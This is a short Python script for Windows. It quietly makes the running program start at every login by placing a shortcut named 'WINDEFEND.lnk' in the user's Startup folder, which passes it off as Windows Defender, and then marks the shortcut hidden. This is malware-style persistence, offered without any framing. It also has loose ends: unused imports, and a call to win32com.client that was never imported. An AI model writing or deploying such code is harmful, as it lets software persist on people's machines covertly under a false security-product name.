import os, shutil, subprocess, sys, winreg as reg, win32com
def run_all():
    try:
        startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        exe_dest = os.path.join(startup_folder, "WINDEFEND.lnk")
        exe_path = sys.executable
        if not os.path.exists(exe_dest):
            wsh = win32com.client.Dispatch("WScript.Shell")
            shortcut = wsh.CreateShortcut(exe_dest)
            shortcut.TargetPath = exe_path
            shortcut.WorkingDirectory = os.path.dirname(exe_path)
            shortcut.Save()
        subprocess.run(f'attrib +h "{exe_dest}"', shell=True)
        print(f"Successfully added to startup and set as hidden: {exe_dest}")
    except Exception as e:
        print(f"Error occurred when adding to startup: {e}")
run_all()